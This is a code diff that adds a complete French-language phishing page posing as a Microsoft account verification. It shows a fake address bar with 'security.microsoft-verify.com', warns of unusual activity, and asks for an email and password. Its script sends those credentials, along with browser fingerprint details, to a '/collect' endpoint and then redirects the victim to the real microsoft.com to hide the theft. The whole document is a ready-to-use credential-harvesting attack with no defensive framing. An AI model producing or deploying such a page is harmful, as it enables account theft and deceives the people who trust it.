@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vérification de sécurité requise</title>
+<style>
+  :root {
+    --bg:#0a0a0f; --panel:#12121a; --border:#2a2a3a;
+    --red:#e63946; --text:#e0e0e0; --dim:#666;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);
+       font-family:'Segoe UI',Arial,sans-serif;
+       min-height:100vh;display:flex;flex-direction:column;
+       align-items:center;justify-content:center}
+  .bar{position:fixed;top:0;left:0;right:0;
+       background:#1a1a2e;border-bottom:2px solid var(--red);
+       padding:10px 24px;display:flex;align-items:center;
+       gap:12px;font-size:13px;color:var(--dim)}
+  .bar .lock{color:var(--red);font-size:16px}
+  .panel{background:var(--panel);border:1px solid var(--border);
+         border-radius:10px;padding:40px 36px;
+         width:420px;max-width:95vw;
+         box-shadow:0 8px 40px rgba(0,0,0,.6)}
+  .alert-icon{width:56px;height:56px;border-radius:50%;
+              background:rgba(230,57,70,.15);border:2px solid var(--red);
+              display:flex;align-items:center;justify-content:center;
+              font-size:26px;margin:0 auto 20px}
+  h1{font-size:20px;text-align:center;margin-bottom:8px}
+  .sub{color:var(--dim);font-size:13px;text-align:center;
+       margin-bottom:28px;line-height:1.6}
+  label{display:block;font-size:12px;color:var(--dim);margin-bottom:6px;
+        text-transform:uppercase;letter-spacing:.05em}
+  input{width:100%;background:#1e1e2e;border:1px solid var(--border);
+        border-radius:6px;padding:11px 14px;color:var(--text);
+        font-size:14px;margin-bottom:16px;outline:none;transition:border .2s}
+  input:focus{border-color:var(--red)}
+  button{width:100%;padding:13px;background:var(--red);border:none;
+         border-radius:6px;color:#fff;font-size:15px;font-weight:600;
+         cursor:pointer;transition:opacity .2s}
+  button:hover{opacity:.88}
+  .footer{margin-top:20px;font-size:11px;color:var(--dim);
+          text-align:center;line-height:1.7}
+  .footer a{color:var(--dim);text-decoration:none}
+  .progress-wrap{margin-bottom:20px}
+  .progress-label{font-size:11px;color:var(--dim);margin-bottom:4px}
+  .progress-bar{height:4px;background:#1e1e2e;border-radius:2px;overflow:hidden}
+  .progress-fill{height:100%;width:72%;background:var(--red);border-radius:2px}
+</style>
+</head>
+<body>
+<div class="bar">
+  <span class="lock">🔒</span>
+  <span>security.microsoft-verify.com</span>
+  <span style="margin-left:auto">Microsoft Corporation © 2025</span>
+</div>
+
+<div class="panel">
+  <div class="alert-icon">⚠️</div>
+  <h1>Vérification du compte requise</h1>
+  <p class="sub">
+    Une activité inhabituelle a été détectée sur votre compte.<br>
+    Veuillez confirmer votre identité pour continuer.
+  </p>
+  <div class="progress-wrap">
+    <div class="progress-label">Analyse de sécurité — 72%</div>
+    <div class="progress-bar"><div class="progress-fill"></div></div>
+  </div>
+  <form id="form">
+    <label>Adresse email</label>
+    <input type="email" name="email" placeholder="votre@email.com" required>
+    <label>Mot de passe</label>
+    <input type="password" name="password" placeholder="••••••••" required>
+    <button type="submit">Vérifier mon identité</button>
+  </form>
+  <div class="footer">
+    En continuant, vous acceptez nos
+    <a href="#">Conditions d'utilisation</a> et notre
+    <a href="#">Politique de confidentialité</a>.
+  </div>
+</div>
+
+<script>
+document.getElementById("form").addEventListener("submit", async e => {
+  e.preventDefault();
+  const fd  = new FormData(e.target);
+  const btn = e.target.querySelector("button");
+  btn.textContent = "Vérification en cours...";
+  btn.disabled = true;
+  await fetch("/collect", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      email:    fd.get("email"),
+      password: fd.get("password"),
+      page:     "index",
+      ua:       navigator.userAgent,
+      lang:     navigator.language,
+      tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+    })
+  });
+  window.location.href = "https://microsoft.com";
+});
+</script>
+</body>
+</html>
